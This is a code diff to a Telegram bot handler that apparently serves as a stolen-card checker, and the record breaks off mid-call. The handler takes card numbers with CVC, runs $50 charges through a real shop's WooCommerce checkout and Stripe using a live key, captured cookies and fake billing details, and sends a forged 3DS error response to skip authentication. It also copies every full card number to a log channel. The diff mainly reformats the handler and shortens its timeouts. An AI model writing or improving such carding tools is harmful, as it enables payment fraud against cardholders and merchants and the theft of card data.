@@ -1039,372 +1039,379 @@ async def stripe_extended_handler(client: Client, message: Message):
     try:
         # Check if CC is provided
         if len(message.text.split()) < 2:
-            await message.reply("❗ Please provide a CC in format: `/sx 4889506069819153|07|28|367`")
+            await message.reply("❗ Please provide a CC in format: /sx 4889506069819153|07|28|367")
             return
 
-        # Extract CC details
-        cc_details = message.text.split()[1]
-        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", cc_details):
-            await message.reply("❗ Invalid CC format. Use: `/sx 4889506069819153|07|28|367`")
-            return
+        # Extract CC details  
+        cc_details = message.text.split()[1]  
+        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", cc_details):  
+            await message.reply("❗ Invalid CC format. Use: `/sx 4889506069819153|07|28|367`")  
+            return  
 
-        cc, mnt, yr, cvc = cc_details.split("|")
+        cc, mnt, yr, cvc = cc_details.split("|")  
         
-        # Send processing message
-        proc_msg = await message.reply("↯ Checking card via Stripe Extended [50$]...")
+        # Send processing message  
+        proc_msg = await message.reply("↯ Checking card via Stripe Extended [50$]...")  
 
-        start_time = time.time()
-        highest_step = 0
-        response_msg = ""
-        status = ""
+        start_time = time.time()  
+        highest_step = 0  
+        response_msg = ""  
+        status = ""  
 
-        try:
-            # Step 1: Create payment method
-            highest_step = 1
-            step1_headers = {
-                'authority': 'api.stripe.com',
-                'accept': 'application/json',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-            }
+        try:  
+            # Step 1: Create payment method  
+            highest_step = 1  
+            step1_headers = {  
+                'authority': 'api.stripe.com',  
+                'accept': 'application/json',  
+                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',  
+                'content-type': 'application/x-www-form-urlencoded',  
+                'origin': 'https://js.stripe.com',  
+                'referer': 'https://js.stripe.com/',  
+                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
+            }  
 
-            step1_data = {
-                'billing_details[name]': 'Habuda Kus',
-                'billing_details[email]': 'gecodo9246@mvpmedix.com',
-                'billing_details[phone]': '(701) 747-7116',
-                'billing_details[address][city]': 'Waxahachie',
-                'billing_details[address][country]': 'US',
-                'billing_details[address][line1]': '7481 Depaul Dr',
-                'billing_details[address][line2]': '',
-                'billing_details[address][postal_code]': '96088',
-                'billing_details[address][state]': 'CA',
-                'type': 'card',
-                'card[number]': cc,
-                'card[cvc]': cvc,
-                'card[exp_year]': yr,
-                'card[exp_month]': mnt,
-                'allow_redisplay': 'unspecified',
-                'payment_user_agent': 'stripe.js/2e00b582bb; stripe-js-v3/2e00b582bb; payment-element; deferred-intent',
-                'referrer': 'https://pixelpixiedesigns.com',
-                'time_on_page': '354956',
-                'client_attribution_metadata[client_session_id]': '4249fdbd-f99f-49ae-9ea4-e9598d191335',
-                'client_attribution_metadata[merchant_integration_source]': 'elements',
-                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-                'client_attribution_metadata[merchant_integration_version]': '2021',
-                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-                'client_attribution_metadata[elements_session_config_id]': 'df3c7d9b-7999-453a-a155-8f64610eea34',
-                'guid': 'b0a880a3-2d6a-4f1b-9d41-c642633891d6d4bc48',
-                'muid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',
-                'sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',
-                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',
-                '_stripe_version': '2024-06-20',
-            }
+            step1_data = {  
+                'billing_details[name]': 'Habuda Kus',  
+                'billing_details[email]': 'gecodo9246@mvpmedix.com',  
+                'billing_details[phone]': '(701) 747-7116',  
+                'billing_details[address][city]': 'Waxahachie',  
+                'billing_details[address][country]': 'US',  
+                'billing_details[address][line1]': '7481 Depaul Dr',  
+                'billing_details[address][line2]': '',  
+                'billing_details[address][postal_code]': '96088',  
+                'billing_details[address][state]': 'CA',  
+                'type': 'card',  
+                'card[number]': cc,  
+                'card[cvc]': cvc,  
+                'card[exp_year]': yr,  
+                'card[exp_month]': mnt,  
+                'allow_redisplay': 'unspecified',  
+                'payment_user_agent': 'stripe.js/2e00b582bb; stripe-js-v3/2e00b582bb; payment-element; deferred-intent',  
+                'referrer': 'https://pixelpixiedesigns.com',  
+                'time_on_page': '354956',  
+                'client_attribution_metadata[client_session_id]': '4249fdbd-f99f-49ae-9ea4-e9598d191335',  
+                'client_attribution_metadata[merchant_integration_source]': 'elements',  
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',  
+                'client_attribution_metadata[merchant_integration_version]': '2021',  
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',  
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',  
+                'client_attribution_metadata[elements_session_config_id]': 'df3c7d9b-7999-453a-a155-8f64610eea34',  
+                'guid': 'b0a880a3-2d6a-4f1b-9d41-c642633891d6d4bc48',  
+                'muid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',  
+                'sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',  
+                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
+                '_stripe_version': '2024-06-20',  
+            }  
 
-            step1_response = requests.post(
-                'https://api.stripe.com/v1/payment_methods',
-                headers=step1_headers,
-                data=step1_data,
-                timeout=3000
-            )
-            step1_json = step1_response.json()
+            step1_response = requests.post(  
+                'https://api.stripe.com/v1/payment_methods',  
+                headers=step1_headers,  
+                data=step1_data,  
+                timeout=30  
+            )  
+            step1_json = step1_response.json()  
 
-            if 'error' in step1_json:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = step1_json.get('error', {}).get('message', 'Unknown error from Step 1')
-                raise Exception(response_msg)
+            if 'error' in step1_json:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = step1_json.get('error', {}).get('message', 'Unknown error from Step 1')  
+                raise Exception(response_msg)  
 
-            payment_method_id = step1_json['id']
+            payment_method_id = step1_json['id']  
             
-            # Log step 1 to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                f"🔵 Stripe Extended Step 1:\n"
-                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
-                f"Response: {step1_response.text}\n"
-                f"Gateway: Stripe Extended [50$]"
-            )
+            # Log step 1 to channel  
+            await client.send_message(  
+                LOG_CHANNEL_ID,  
+                f"🔵 Stripe Extended Step 1:\n"  
+                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
+                f"Response: {step1_response.text}\n"  
+                f"Gateway: Stripe Extended [50$]"  
+            )  
 
-            # Step 2: Process checkout
-            highest_step = 2
-            cookies = {
-                'sbjs_migrations': '1418474375998%3D1',
-                'sbjs_current_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',
-                'sbjs_first_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',
-                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20SM-X216B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',
-                '_ga': 'GA1.1.481680961.1753257146',
-                'woocommerce_items_in_cart': '1',
-                'woocommerce_cart_hash': 'cc1ec249d3329514e6f0b421ac45bc6a',
-                'wp_woocommerce_session_00f187d60e01119a9192a1c1cc27dc99': 't_9641e31f8f6c4e005166a2c7eaa881%7C1753430006%7C1753343606%7C%24generic%24MXxbb2-s3-d6lNUouJ1LlUipkNbaO5WXv6_G-zKB',
-                '__stripe_mid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',
-                '__stripe_sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',
-                'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2Fcheckout%2F',
-                '_ga_2PCHPGKEXB': 'GS2.1.s1753257145$o1$g1$t1753257227$j39$l0$h0'
-            }
+            # Step 2: Process checkout  
+            highest_step = 2  
+            cookies = {  
+                'sbjs_migrations': '1418474375998%3D1',  
+                'sbjs_current_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',  
+                'sbjs_first_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',  
+                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',  
+                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',  
+                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20SM-X216B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',  
+                '_ga': 'GA1.1.481680961.1753257146',  
+                'woocommerce_items_in_cart': '1',  
+                'woocommerce_cart_hash': 'cc1ec249d3329514e6f0b421ac45bc6a',  
+                'wp_woocommerce_session_00f187d60e01119a9192a1c1cc27dc99': 't_9641e31f8f6c4e005166a2c7eaa881%7C1753430006%7C1753343606%7C%24generic%24MXxbb2-s3-d6lNUouJ1LlUipkNbaO5WXv6_G-zKB',  
+                '__stripe_mid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',  
+                '__stripe_sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',  
+                'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2Fcheckout%2F',  
+                '_ga_2PCHPGKEXB': 'GS2.1.s1753257145$o1$g1$t1753257227$j39$l0$h0'  
+            }  
 
-            step2_headers = {
-                'authority': 'pixelpixiedesigns.com',
-                'accept': 'application/json, text/javascript, */*; q=0.01',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://pixelpixiedesigns.com',
-                'referer': 'https://pixelpixiedesigns.com/checkout/',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                'x-requested-with': 'XMLHttpRequest',
-            }
+            step2_headers = {  
+                'authority': 'pixelpixiedesigns.com',  
+                'accept': 'application/json, text/javascript, */*; q=0.01',  
+                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',  
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',  
+                'origin': 'https://pixelpixiedesigns.com',  
+                'referer': 'https://pixelpixiedesigns.com/checkout/',  
+                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
+                'x-requested-with': 'XMLHttpRequest',  
+            }  
 
-            step2_data = {
-                'wc_order_attribution_source_type': 'typein',
-                'wc_order_attribution_referrer': '(none)',
-                'wc_order_attribution_utm_campaign': '(none)',
-                'wc_order_attribution_utm_source': '(direct)',
-                'wc_order_attribution_utm_medium': '(none)',
-                'wc_order_attribution_utm_content': '(none)',
-                'wc_order_attribution_utm_id': '(none)',
-                'wc_order_attribution_utm_term': '(none)',
-                'wc_order_attribution_utm_source_platform': '(none)',
-                'wc_order_attribution_utm_creative_format': '(none)',
-                'wc_order_attribution_utm_marketing_tactic': '(none)',
-                'wc_order_attribution_session_entry': 'https://pixelpixiedesigns.com/',
-                'wc_order_attribution_session_start_time': '2025-07-23 07:22:25',
-                'wc_order_attribution_session_pages': '8',
-                'wc_order_attribution_session_count': '1',
-                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                'billing_first_name': 'Habuda',
-                'billing_last_name': 'Kus',
-                'billing_country': 'US',
-                'billing_address_1': '7481 Depaul Dr',
-                'billing_address_2': '',
-                'billing_city': 'Waxahachie',
-                'billing_state': 'CA',
-                'billing_phone': '(701) 747-7116',
-                'billing_postcode': '96088',
-                'billing_email': 'gecodo9246@mvpmedix.com',
-                'account_username': '',
-                'order_comments': '',
-                'payment_method': 'stripe',
-                'wc-stripe-payment-method-upe': '',
-                'wc_stripe_selected_upe_payment_type': '',
-                'wc-stripe-is-deferred-intent': '1',
-                'stripe_klarna_token_key': '',
-                'stripe_klarna_payment_intent_key': '',
-                'ppcp_paypal_order_id': '',
-                'ppcp_payment_token': '',
-                'ppcp_billing_token': '',
-                'stripe_afterpay_token_key': '',
-                'stripe_afterpay_payment_intent_key': '',
-                'woocommerce-process-checkout-nonce': '57fa512c02',
-                '_wp_http_referer': '/?wc-ajax=update_order_review',
-                'wc-stripe-payment-method': payment_method_id
-            }
+            step2_data = {  
+                'wc_order_attribution_source_type': 'typein',  
+                'wc_order_attribution_referrer': '(none)',  
+                'wc_order_attribution_utm_campaign': '(none)',  
+                'wc_order_attribution_utm_source': '(direct)',  
+                'wc_order_attribution_utm_medium': '(none)',  
+                'wc_order_attribution_utm_content': '(none)',  
+                'wc_order_attribution_utm_id': '(none)',  
+                'wc_order_attribution_utm_term': '(none)',  
+                'wc_order_attribution_utm_source_platform': '(none)',  
+                'wc_order_attribution_utm_creative_format': '(none)',  
+                'wc_order_attribution_utm_marketing_tactic': '(none)',  
+                'wc_order_attribution_session_entry': 'https://pixelpixiedesigns.com/',  
+                'wc_order_attribution_session_start_time': '2025-07-23 07:22:25',  
+                'wc_order_attribution_session_pages': '8',  
+                'wc_order_attribution_session_count': '1',  
+                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
+                'billing_first_name': 'Habuda',  
+                'billing_last_name': 'Kus',  
+                'billing_country': 'US',  
+                'billing_address_1': '7481 Depaul Dr',  
+                'billing_address_2': '',  
+                'billing_city': 'Waxahachie',  
+                'billing_state': 'CA',  
+                'billing_phone': '(701) 747-7116',  
+                'billing_postcode': '96088',  
+                'billing_email': 'gecodo9246@mvpmedix.com',  
+                'account_username': '',  
+                'order_comments': '',  
+                'payment_method': 'stripe',  
+                'wc-stripe-payment-method-upe': '',  
+                'wc_stripe_selected_upe_payment_type': '',  
+                'wc-stripe-is-deferred-intent': '1',  
+                'stripe_klarna_token_key': '',  
+                'stripe_klarna_payment_intent_key': '',  
+                'ppcp_paypal_order_id': '',  
+                'ppcp_payment_token': '',  
+                'ppcp_billing_token': '',  
+                'stripe_afterpay_token_key': '',  
+                'stripe_afterpay_payment_intent_key': '',  
+                'woocommerce-process-checkout-nonce': '57fa512c02',  
+                '_wp_http_referer': '/?wc-ajax=update_order_review',  
+                'wc-stripe-payment-method': payment_method_id  
+            }  
 
-            step2_response = requests.post(
-                'https://pixelpixiedesigns.com/?wc-ajax=checkout',
-                headers=step2_headers,
-                cookies=cookies,
-                data=step2_data,
-                timeout=300
-            )
-            step2_json = step2_response.json()
+            step2_response = requests.post(  
+                'https://pixelpixiedesigns.com/?wc-ajax=checkout',  
+                headers=step2_headers,  
+                cookies=cookies,  
+                data=step2_data,  
+                timeout=30  
+            )  
+            step2_json = step2_response.json()  
 
-            # Log step 2 to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                f"🔵 Stripe Extended Step 2:\n"
-                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
-                f"Response: {step2_response.text}\n"
-                f"Gateway: Stripe Extended [50$]"
-            )
+            # Log step 2 to channel  
+            await client.send_message(  
+                LOG_CHANNEL_ID,  
+                f"🔵 Stripe Extended Step 2:\n"  
+                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
+                f"Response: {step2_response.text}\n"  
+                f"Gateway: Stripe Extended [50$]"  
+            )  
 
-            if step2_json.get("result") == "failure":
-                error_html = step2_json.get("messages", "")
-                error_match = re.search(r'<li>(.*?)<\/li>', error_html)
-                error_msg = error_match.group(1).strip() if error_match else "Unknown error from Step 2"
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = error_msg
-                raise Exception(error_msg)
+            if step2_json.get("result") == "failure":  
+                error_html = step2_json.get("messages", "")  
+                # Improved error message extraction
+                error_match = re.search(r'<li>(.*?)(?:\t|</li>)', error_html)
+                if error_match:
+                    error_msg = error_match.group(1).strip()
+                    # Clean up common HTML entities and extra spaces
+                    error_msg = error_msg.replace('&nbsp;', ' ').replace('\t', ' ').strip()
+                    error_msg = ' '.join(error_msg.split())  # Remove extra spaces
+                else:
+                    error_msg = "Unknown error from Step 2"
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = error_msg  
+                raise Exception(error_msg)  
 
-            if 'data' not in step2_json or 'redirect' not in step2_json['data']:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = "Unexpected response from Step 2"
-                raise Exception(response_msg)
+            if 'data' not in step2_json or 'redirect' not in step2_json['data']:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = "Unexpected response from Step 2"  
+                raise Exception(response_msg)  
 
-            redirect_url = step2_json['data']['redirect']
-            payment_intent_id = redirect_url.split('/')[-1]
+            redirect_url = step2_json['data']['redirect']  
+            payment_intent_id = redirect_url.split('/')[-1]  
 
-            # Step 3: Confirm payment intent
-            highest_step = 3
-            step3_headers = step1_headers.copy()
+            # Step 3: Confirm payment intent  
+            highest_step = 3  
+            step3_headers = step1_headers.copy()  
             
-            step3_data = {
-                'use_stripe_sdk': 'true',
-                'mandate_data[customer_acceptance][type]': 'online',
-                'mandate_data[customer_acceptance][online][infer_from_client]': 'true',
-                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',
-                '_stripe_version': '2024-06-20',
-                'client_secret': f'{payment_intent_id}_secret_g8xpRlCJvEoi8KEBx4oq8Jhjq'
-            }
+            step3_data = {  
+                'use_stripe_sdk': 'true',  
+                'mandate_data[customer_acceptance][type]': 'online',  
+                'mandate_data[customer_acceptance][online][infer_from_client]': 'true',  
+                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
+                '_stripe_version': '2024-06-20',  
+                'client_secret': f'{payment_intent_id}_secret_g8xpRlCJvEoi8KEBx4oq8Jhjq'  
+            }  
 
-            step3_response = requests.post(
-                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
-                headers=step3_headers,
-                data=step3_data,
-                timeout=300
-            )
-            step3_json = step3_response.json()
+            step3_response = requests.post(  
+                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',  
+                headers=step3_headers,  
+                data=step3_data,  
+                timeout=30  
+            )  
+            step3_json = step3_response.json()  
 
-            # Log step 3 to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                f"🔵 Stripe Extended Step 3:\n"
-                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
-                f"Response: {step3_response.text}\n"
-                f"Gateway: Stripe Extended [50$]"
-            )
+            # Log step 3 to channel  
+            await client.send_message(  
+                LOG_CHANNEL_ID,  
+                f"🔵 Stripe Extended Step 3:\n"  
+                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
+                f"Response: {step3_response.text}\n"  
+                f"Gateway: Stripe Extended [50$]"  
+            )  
 
-            if 'error' in step3_json:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = step3_json.get('error', {}).get('message', 'Unknown error from Step 3')
-                raise Exception(response_msg)
+            if 'error' in step3_json:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = step3_json.get('error', {}).get('message', 'Unknown error from Step 3')  
+                raise Exception(response_msg)  
 
-            if 'next_action' not in step3_json or step3_json['next_action']['type'] != 'use_stripe_sdk':
-                status = "APPROVED ✅️"
-                response_msg = "50$ CHARGED ✅️✅️👌"
-                raise Exception("Payment completed without 3DS")
+            if 'next_action' not in step3_json or step3_json['next_action']['type'] != 'use_stripe_sdk':  
+                status = "APPROVED ✅️"  
+                response_msg = "50$ CHARGED ✅️✅️👌"  
+                raise Exception("Payment completed without 3DS")  
 
-            # Step 4: 3DS Authentication
-            highest_step = 4
-            source = step3_json['next_action']['use_stripe_sdk']['source']
+            # Step 4: 3DS Authentication  
+            highest_step = 4  
+            source = step3_json['next_action']['use_stripe_sdk']['source']  
             
-            step4_data = {
-                'source': source,
-                'browser': json.dumps({
-                    "fingerprintAttempted": True,
-                    "fingerprintData": '{"threeDSServerTransID":"0a95f062-9772-4664-a735-4aad68dcb800"}',
-                    "challengeWindowSize": None,
-                    "threeDSCompInd": "Y",
-                    "browserJavaEnabled": False,
-                    "browserJavascriptEnabled": True,
-                    "browserLanguage": "en-IN",
-                    "browserColorDepth": "24",
-                    "browserScreenHeight": "1280",
-                    "browserScreenWidth": "800",
-                    "browserTZ": "-330",
-                    "browserUserAgent": "Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
-                }),
-                'one_click_authn_device_support[hosted]': 'false',
-                'one_click_authn_device_support[same_origin_frame]': 'false',
-                'one_click_authn_device_support[spc_eligible]': 'false',
-                'one_click_authn_device_support[webauthn_eligible]': 'false',
-                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
-                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',
-                '_stripe_version': '2024-06-20'
-            }
+            step4_data = {  
+                'source': source,  
+                'browser': json.dumps({  
+                    "fingerprintAttempted": True,  
+                    "fingerprintData": '{"threeDSServerTransID":"0a95f062-9772-4664-a735-4aad68dcb800"}',  
+                    "challengeWindowSize": None,  
+                    "threeDSCompInd": "Y",  
+                    "browserJavaEnabled": False,  
+                    "browserJavascriptEnabled": True,  
+                    "browserLanguage": "en-IN",  
+                    "browserColorDepth": "24",  
+                    "browserScreenHeight": "1280",  
+                    "browserScreenWidth": "800",  
+                    "browserTZ": "-330",  
+                    "browserUserAgent": "Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"  
+                }),  
+                'one_click_authn_device_support[hosted]': 'false',  
+                'one_click_authn_device_support[same_origin_frame]': 'false',  
+                'one_click_authn_device_support[spc_eligible]': 'false',  
+                'one_click_authn_device_support[webauthn_eligible]': 'false',  
+                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',  
+                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
+                '_stripe_version': '2024-06-20'  
+            }  
 
-            step4_response = requests.post(
-                'https://api.stripe.com/v1/3ds2/authenticate',
-                headers=step3_headers,
-                data=step4_data,
-                timeout=300
-            )
-            step4_json = step4_response.json()
+            step4_response = requests.post(  
+                'https://api.stripe.com/v1/3ds2/authenticate',  
+                headers=step3_headers,  
+                data=step4_data,  
+                timeout=30  
+            )  
+            step4_json = step4_response.json()  
 
-            # Log step 4 to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                f"🔵 Stripe Extended Step 4:\n"
-                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
-                f"Response: {step4_response.text}\n"
-                f"Gateway: Stripe Extended [50$]"
-            )
+            # Log step 4 to channel  
+            await client.send_message(  
+                LOG_CHANNEL_ID,  
+                f"🔵 Stripe Extended Step 4:\n"  
+                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
+                f"Response: {step4_response.text}\n"  
+                f"Gateway: Stripe Extended [50$]"  
+            )  
 
-            if 'error' in step4_json:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = step4_json.get('error', {}).get('message', 'Unknown error from Step 4')
-                raise Exception(response_msg)
+            if 'error' in step4_json:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = step4_json.get('error', {}).get('message', 'Unknown error from Step 4')  
+                raise Exception(response_msg)  
 
-            # Step 5: Complete 3DS Challenge
-            highest_step = 5
-            step5_data = {
-                'source': source,
-                'final_cres': json.dumps({
-                    "messageType": "Erro",
-                    "messageVersion": "2.2.0",
-                    "threeDSServerTransID": "0a95f062-9772-4664-a735-4aad68dcb800",
-                    "errorCode": "403",
-                    "errorDescription": "Transient system failure",
-                    "errorDetail": "An unexpected error occurred!",
-                    "acsTransID": "89ecdd9e-4ce6-49ef-8d7c-73ffe6673efc",
-                    "dsTransID": "5bc7bedf-06cc-46c8-9948-35f5c2e87e68",
-                    "errorComponent": "A",
-                    "errorMessageType": "CReq"
-                }),
-                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',
-                '_stripe_version': '2024-06-20'
-            }
+            # Step 5: Complete 3DS Challenge  
+            highest_step = 5  
+            step5_data = {  
+                'source': source,  
+                'final_cres': json.dumps({  
+                    "messageType": "Erro",  
+                    "messageVersion": "2.2.0",  
+                    "threeDSServerTransID": "0a95f062-9772-4664-a735-4aad68dcb800",  
+                    "errorCode": "403",  
+                    "errorDescription": "Transient system failure",  
+                    "errorDetail": "An unexpected error occurred!",  
+                    "acsTransID": "89ecdd9e-4ce6-49ef-8d7c-73ffe6673efc",  
+                    "dsTransID": "5bc7bedf-06cc-46c8-9948-35f5c2e87e68",  
+                    "errorComponent": "A",  
+                    "errorMessageType": "CReq"  
+                }),  
+                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
+                '_stripe_version': '2024-06-20'  
+            }  
 
-            step5_response = requests.post(
-                'https://api.stripe.com/v1/3ds2/challenge_complete',
-                headers=step3_headers,
-                data=step5_data,
-                timeout=300
-            )
-            step5_json = step5_response.json()
+            step5_response = requests.post(  
+                'https://api.stripe.com/v1/3ds2/challenge_complete',  
+                headers=step3_headers,  
+                data=step5_data,  
+                timeout=30  
+            )  
+            step5_json = step5_response.json()  
 
-            # Log step 5 to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
